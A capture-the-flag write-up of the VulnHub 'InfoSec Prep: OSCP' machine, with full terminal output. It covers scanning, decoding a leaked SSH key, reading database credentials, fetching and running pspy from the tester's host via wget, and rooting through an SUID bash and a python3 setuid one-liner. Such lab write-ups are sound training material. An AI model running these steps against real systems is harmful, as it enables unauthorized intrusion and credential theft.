# Ports Scan & Enumeration
## Ports Scan
```console
└─$ nmap -Pn -p- 192.168.59.156
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 12:32 AEST
Nmap scan report for 192.168.59.156
Host is up (0.0014s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds

┌──(htb㉿kali)-[~/Writeups/VulnHub/InfoSec Prep: OSCP]
└─$ nmap -Pn -p22,80,33060 -A 192.168.59.156
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 12:32 AEST
Nmap scan report for 192.168.59.156
Host is up (0.00093s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx?
| fingerprint-strings:
|   LDAPSearchReq, NotesRPC:
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=5/20%Time=60A5CA5D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRe
SF:quest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Te
SF:rminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x
SF:05\0\0\0\x0b\x08\x05\x1a\0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\
SF:x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SIPOption
SF:s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x
SF:01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(WMSRequest
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.50 seconds
```

- Wordpress confirmed, and we have a possible mysql

## Web Enum
### nikto
```console
┌──(htb㉿kali)-[~/Writeups/VulnHub]
└─$ nikto -host 192.168.59.156
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.59.156
+ Target Hostname:    192.168.59.156
+ Target Port:        80
+ Start Time:         2021-05-20 13:09:28 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://192.168.59.156/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/secret.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7918 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-05-20 13:10:38 (GMT10) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### gobuster
```console
┌──(htb㉿kali)-[~/Writeups/VulnHub]
└─$ gobuster dir -u http://192.168.59.156 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,sh,jsp,asp,aspx,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.59.156
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,sh,jsp,asp,aspx,php,txt
[+] Timeout:                 10s
===============================================================
2021/05/20 13:11:13 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://192.168.59.156/]
/wp-content           (Status: 301) [Size: 321] [--> http://192.168.59.156/wp-content/]
/wp-login.php         (Status: 200) [Size: 4829]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.59.156/wp-includes/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.59.156/javascript/]
/readme.html          (Status: 200) [Size: 7278]
/robots.txt           (Status: 200) [Size: 36]
/wp-trackback.php     (Status: 200) [Size: 135]
/secret.txt           (Status: 200) [Size: 3502]
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.59.156/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.59.156/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 279]

===============================================================
2021/05/20 13:39:41 Finished
===============================================================
```
- `robots.txt` and `secret.txt` confirmed.

### wpscan
```console
┌──(htb㉿kali)-[~/Writeups/VulnHub]
└─$ wpscan -e ap,at,u,m --url http://192.168.59.156                                                             4 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.59.156/ [192.168.59.156]
[+] Started: Thu May 20 13:43:51 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.59.156/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.59.156/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.59.156/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.59.156/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.59.156/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.59.156/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.59.156/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.59.156/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.59.156/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:18 <================================> (22449 / 22449) 100.00% Time: 00:01:18
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://192.168.59.156/wp-content/themes/twentynineteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.59.156/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://192.168.59.156/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://192.168.59.156/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://192.168.59.156/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://192.168.59.156/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentytwenty
 | Location: http://192.168.59.156/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.59.156/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.59.156/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.156/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.59.156/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 20 13:45:24 2021
[+] Requests Done: 22611
[+] Cached Requests: 18
[+] Data Sent: 5.946 MB
[+] Data Received: 3.726 MB
[+] Memory used: 287.262 MB
[+] Elapsed time: 00:01:32
```

### Poke around
- let's check robots.txt
![](Pasted%20image%2020210520140040.png)
- So it point to secret.txt
![](Pasted%20image%2020210520140250.png)
- Seems like some file base64 encrypted.
![](Pasted%20image%2020210520140554.png)
- it's an OpenSSH private key. should be our way in.
```console
┌──(htb㉿kali)-[/tmp]
└─$ curl -s http://192.168.59.156/secret.txt | base64 -d > id_rsa

┌──(htb㉿kali)-[/tmp]
└─$ chmod 600 id_rsa

┌──(htb㉿kali)-[/tmp]
└─$ ssh -i id_rsa 192.168.59.156
The authenticity of host '192.168.59.156 (192.168.59.156)' can't be established.
ECDSA key fingerprint is SHA256:j6pDoPWkkeKgplTqHPtxSxrMqrQRMPl5AIW2Lfn14y8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.59.156' (ECDSA) to the list of known hosts.
htb@192.168.59.156: Permission denied (publickey).
```
- Wrong username, so I need a correct username.
- Have tried some username, guessing by all the clues we have so far, and the blog from wordpress is named as OSCP Voucher, so hmmm, I tried oscp, and luckily it's working, to be honest, just a blindly try, did not expect it would work.....
```console
┌──(htb㉿kali)-[/tmp]
└─$ ssh -i id_rsa admin@192.168.59.156
admin@192.168.59.156: Permission denied (publickey).

┌──(htb㉿kali)-[/tmp]
└─$ ssh -i id_rsa oscp@192.168.59.156                                                                         255 ⨯
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 May 2021 08:30:39 AM UTC

  System load:  0.1                Processes:             206
  Usage of /:   27.1% of 19.56GB   Users logged in:       0
  Memory usage: 60%                IPv4 address for eth0: 192.168.59.156
  Swap usage:   4%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
-bash-5.0$ echo $SHELL
/bin/bash
-bash-5.0$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
oscp:x:1000:1000:oscp:/home/oscp:/bin/bash
-bash-5.0$ cd ~
-bash-5.0$ ls -al
total 32
drwxr-xr-x 4 oscp oscp 4096 Jul 11  2020 .
drwxr-xr-x 3 root root 4096 Jul  9  2020 ..
-rw------- 1 oscp oscp    0 Jul 11  2020 .bash_history
-rw-r--r-- 1 oscp oscp  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 oscp oscp 3771 Feb 25  2020 .bashrc
drwx------ 2 oscp oscp 4096 Jul  9  2020 .cache
-rwxr-xr-x 1 root root   88 Jul  9  2020 ip
-rw-r--r-- 1 oscp oscp  807 Feb 25  2020 .profile
drwxrwxr-x 2 oscp oscp 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 oscp oscp    0 Jul  9  2020 .sudo_as_admin_successful
-bash-5.0$ cat ip
#!/bin/sh
cp /etc/issue-standard /etc/issue
/usr/local/bin/get-ip-address >> /etc/issue
-bash-5.0$ cat /etc/issue
Ubuntu 20.04 LTS \n \l

ip: 192.168.59.156
-bash-5.0$ sudo -l
[sudo] password for oscp:

```

- So not yet go check wp-config.php, but we have an ip script own by root, not sure if there's a cron job for root yet.
```console
-bash-5.0$ cd /var/www/html
-bash-5.0$ ls
index.php    secret.txt          wp-comments-post.php  wp-cron.php        wp-login.php     wp-trackback.php
license.txt  wp-activate.php     wp-config.php         wp-includes        wp-mail.php      xmlrpc.php
readme.html  wp-admin            wp-config-sample.php  wp-links-opml.php  wp-settings.php
robots.txt   wp-blog-header.php  wp-content            wp-load.php        wp-signup.php
-bash-5.0$ grep -n5 password wp-config.php
23-define( 'DB_NAME', 'wordpress' );
24-
25-/** MySQL database username */
26-define( 'DB_USER', 'wordpress' );
27-
28:/** MySQL database password */
29-define( 'DB_PASSWORD', 'Oscp12345!' );
30-
31-/** MySQL hostname */
32-define( 'DB_HOST', 'localhost' );
33-
-bash-5.0$ ps aux | grep mysql
mysql        985  4.2 28.3 1289336 277188 ?      Ssl  May20  56:53 /usr/sbin/mysqld
oscp       51607  0.0  0.0   6432   736 pts/0    S+   08:38   0:00 grep mysql
```
- Now we can poke the mysql, hmmm, but I would say, does the box maker would know that people might guess the username? or is the wordpress suppose to be the way in?
```console
-bash-5.0$ mysql -u wordpress -pOscp12345! -h localhost
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 504147
Server version: 8.0.20-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.03 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> describe wp_users
    -> ;
+---------------------+-----------------+------+-----+---------------------+----------------+
| Field               | Type            | Null | Key | Default             | Extra          |
+---------------------+-----------------+------+-----+---------------------+----------------+
| ID                  | bigint unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)     | NO   | MUL |                     |                |
| user_pass           | varchar(255)    | NO   |     |                     |                |
| user_nicename       | varchar(50)     | NO   | MUL |                     |                |
| user_email          | varchar(100)    | NO   | MUL |                     |                |
| user_url            | varchar(100)    | NO   |     |                     |                |
| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)    | NO   |     |                     |                |
| user_status         | int             | NO   |     | 0                   |                |
| display_name        | varchar(250)    | NO   |     |                     |                |
+---------------------+-----------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$Bx9ohXoCVR5lkKtuQbuWuh2P36Pr1D0 |
+------------+------------------------------------+
1 row in set (0.00 sec)
```

- hmmmmm, tried some online hash cracking tool, but no luck.
- OK, my bad, this is not suppose to be a username guessing work, because the post of wordpress did tell us......
![](Pasted%20image%2020210521104853.png)
- Now can't crack the wordpress creds make sense.
- Try to see if there's anything executing by cron
```console
-bash-5.0$ cd /dev/shm
-bash-5.0$ wget http://192.168.59.60:8000/pspy64
--2021-05-21 09:13:25--  http://192.168.59.60:8000/pspy64
Connecting to 192.168.59.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                       100%[==============================================>]   2.94M  --.-KB/s    in 0.1s

2021-05-21 09:13:25 (24.9 MB/s) - ‘pspy64’ saved [3078592/3078592]

-bash-5.0$ chmod +x pspy64
-bash-5.0$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
...[snip]...
2021/05/21 09:13:37 CMD: UID=0    PID=1      | /sbin/init auto automatic-ubiquity noprompt
2021/05/21 09:14:01 CMD: UID=0    PID=53085  | /usr/sbin/CRON -f
2021/05/21 09:14:01 CMD: UID=0    PID=53086  | /bin/sh -c sh -c "/root/fix-wordpress"
2021/05/21 09:14:01 CMD: UID=0    PID=53088  | /bin/sh /root/fix-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53087  | sh -c /root/fix-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53094  | awk { print "http://"$2 }
2021/05/21 09:14:01 CMD: UID=0    PID=53093  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53092  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53091  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53090  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53089  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:14:01 CMD: UID=0    PID=53095  | mysql -u root -N -B
2021/05/21 09:15:01 CMD: UID=0    PID=53121  | /usr/sbin/CRON -f
2021/05/21 09:15:01 CMD: UID=0    PID=53124  | sh -c /root/fix-wordpress
2021/05/21 09:15:01 CMD: UID=0    PID=53123  | sh -c /root/fix-wordpress
2021/05/21 09:15:01 CMD: UID=0    PID=53122  | /bin/sh -c sh -c "/root/fix-wordpress"
2021/05/21 09:15:02 CMD: UID=0    PID=53130  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53129  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53128  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53127  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53126  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53125  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:15:02 CMD: UID=0    PID=53131  | mysql -u root -N -B
2021/05/21 09:16:01 CMD: UID=0    PID=53156  | /usr/sbin/CRON -f
2021/05/21 09:16:01 CMD: UID=0    PID=53157  | /bin/sh -c sh -c "/root/fix-wordpress"
2021/05/21 09:16:01 CMD: UID=0    PID=53160  | /bin/sh /root/fix-wordpress
2021/05/21 09:16:01 CMD: UID=0    PID=53159  | /bin/sh /root/fix-wordpress
2021/05/21 09:16:01 CMD: UID=0    PID=53158  | sh -c /root/fix-wordpress
2021/05/21 09:16:01 CMD: UID=0    PID=53165  | awk { print "http://"$2 }
2021/05/21 09:16:01 CMD: UID=0    PID=53164  | grep -v inet6
2021/05/21 09:16:01 CMD: UID=0    PID=53163  | grep -v 127.0.0.1
2021/05/21 09:16:01 CMD: UID=0    PID=53162  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:16:01 CMD: UID=0    PID=53161  | /bin/sh /usr/local/bin/get-ip-wordpress
2021/05/21 09:16:01 CMD: UID=0    PID=53166  | mysql -u root -N -B
^CExiting program... (interrupt)
```
- run linpeas to get information, and we have /usr/bin/bash is SUID and SGID
```console
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-sr-x 1 root   root            1.2M Feb 25  2020 /usr/bin/bash

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root   root    1.2M Feb 25  2020 /usr/bin/bash
```

![](Pasted%20image%2020210521120433.png)
```console
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# cd /root
bash-5.0# ls
fix-wordpress  flag.txt  snap
bash-5.0# cat flag.txt
d73b04b0e696b0945283defa3eee4538

bash-5.0# crontab -l
no crontab for oscp
bash-5.0# python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
bash: python: command not found
bash-5.0# which python
bash-5.0# which python3
/usr/bin/python3
bash-5.0# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@oscp:/root# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
root@oscp:/root# crontab -l
* * * * * sh -c "/root/fix-wordpress"

root@oscp:/root# cat fix-wordpress
#!/bin/sh
IP=$(/usr/local/bin/get-ip-wordpress)
mysql -u root -N -B > /dev/null 2>&1 << EOF
use wordpress;
update wp_options set option_value="$IP" where option_name="siteurl";
update wp_options set option_value="$IP" where option_name="home";
EOF
```
